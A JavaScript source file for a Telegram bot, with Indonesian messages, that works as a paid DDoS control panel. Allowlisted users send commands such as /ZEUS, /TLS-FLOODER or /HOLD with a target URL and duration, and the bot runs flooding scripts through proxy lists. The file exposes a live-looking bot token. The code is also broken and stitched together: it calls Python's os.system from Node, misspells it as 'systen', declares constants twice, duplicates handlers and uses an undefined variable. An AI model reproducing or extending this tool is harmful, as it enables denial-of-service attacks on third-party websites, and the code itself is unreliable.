
const TeleBot = require('telebot');

const bot = new TeleBot('6492006202:AAGjR7kRmNoyHiop7VS0gnu7_A6zfAJjXhA');

// Add your bot's functionality here

bot.start();

function run_ZEUS(url, time) {
    os.system(`node ZEUS.js ${url} ${time} 512 10 proxy.txt`);
}

function run_entot(url, time) {
    os.system(`node HTTP-ENTOD.js ${url} 512 ${time}`);
}

function run_LEZKILL(url, time) {
    os.system(`node LEZKILL.js ${url} ${time} 512 10 proxy.txt`);
}

function run_raw(url, time) {
    os.system(`node HTTP-RAW.js ${url} ${time}`);
}

function run_tls(url, time) {
    os.system(`node tlsv2.js ${url} ${time} 10 512 proxy.txt`);
}

function run_tls2(url, time) {
    os.system(`node madara.js ${url} ${time} 32 10 proxy.txt`);
}

function run_tlsbypass(url) {
    os.systen(`node TLS-BYPASS.js ${url} 120 60 98 proxy.txt`);
}

function run_tlsflooder(url, time) {
    os.systen(`node TLS-FLOODER.js ${url} ${time} 10 10 proxy.txt`);
}

function run_hold(url, time) {
    os.systen(`node hold.js ${url} ${time} 10 10 proxy.txt`);
}

const allowedUsernames = ['GMFR444X'];

bot.on('/usage', (msg) => {
    bot.replyTo(msg, 'Cara Menggunakan /[METHOD] [URL] [TIME] Untuk Thread Dll Sudah Owner Setting Agar Tidak Melebihi Batas Anj');
});

bot.on('/start', (msg) => {
    if (allowedUsernames.includes(msg.from.username)) {
        bot.replyTo(msg, `Halo! Akses Diterima\n\nTutorial menggunakan /usage\nShow all method /method`);
    } else {
        bot.replyTo(msg, 'Akses ditolak. Username Anda tidak terdaftar harap membeli plan Hwheheh');
    }
});

bot.on('/menu', (msg) => {
    bot.replyTo(msg, 'Usage: /[METHOD] [URL] [TIME] Thread Dll Owner Yang Nentuin Anj');
});

bot.on('/ZEUS', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_ZEUS(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/HTTP', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_entot(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/HTTP-RAW', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_raw(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/tls2', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_tls2(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/TLS', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_tls(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/LEZ-KILL', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_LEZKILL(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/TLS-BYPASS', (msg) => {
    const [command, url] = msg.text.split(' ', 2);

    if (url) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_tlsbypass(url);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/TLS-FLOODER', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_tlsflooder(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/HOLD', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_tlsflooder(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

function run_tlsflooder(url, time) {
    os.system(`node TLS-FLOODER.js ${url} ${time} 10 10 proxy.txt`);
}

function run_hold(url, time) {
    os.systen(`node hold.js ${url} ${time} 10 10 proxy.txt`);
}

const allowedUsernames = ['YanStore'];

bot.on('/HOLD', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_hold(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/TLS-FLOODER', (msg) => {
    const [command, url, time] = msg.text.split(' ', 3);

    if (url && time) {
        bot.replyTo(msg, `Menjalankan ddos untuk ${url} selama ${time} detik...`);
        run_tlsflooder(url, time);
        bot.replyTo(msg, 'Attack Successfully');
    } else {
        bot.replyTo(msg, 'URL atau waktu tidak valid. Ketik /attack [URL] [TIME] untuk memulai serangan.');
    }
});

bot.on('/method', (msg) => {
    const response = `L7 :\nHTTP\nHTTP-RAW\ntls2\nFLOODER\nTLS\nTLS-BYPASS\nTLS-FLOODER\nZEUS\n\nL4 :\nLEZ-KILL`;
    bot.replyTo(msg, response);
});

bot.on('text', (msg) => {
    bot.replyTo(msg, 'Maaf, perintah tidak valid. Ketik /start untuk memulai.');
});

bot.start();
 